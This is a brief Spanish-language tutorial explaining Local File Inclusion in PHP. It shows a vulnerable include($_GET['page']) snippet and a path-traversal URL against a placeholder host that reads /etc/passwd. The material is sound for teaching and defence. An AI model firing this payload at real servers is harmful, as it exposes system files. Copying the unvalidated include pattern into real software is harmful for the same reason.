Local File Inclusion es una vulnerabilidad web que ocurre cuando una aplicación permite al usuario controlar el nombre de un archivo que será cargado o incluido por el servidor. Si no se valida correctamente, un atacante puede leer archivos locales del servidor.

##### ¿Dónde se da?

Suele aparecer en páginas PHP o similares, donde se usa algo como:

```
<?php include($_GET['page']); ?>
```

Si la pagina tiene page= en la mayoria de los casos se puede probar un LFI

```
http://victima.com/index.php?page=home.php
```

#### LFI:

```
http://victima.com/index.php?page=../../../../etc/passwd
```

Y el servidor no valida el input, termina haciendo:

```
include('../../../../etc/passwd');
```

Y esto nos termina mostrando el contenido del archivo /etc/passwd


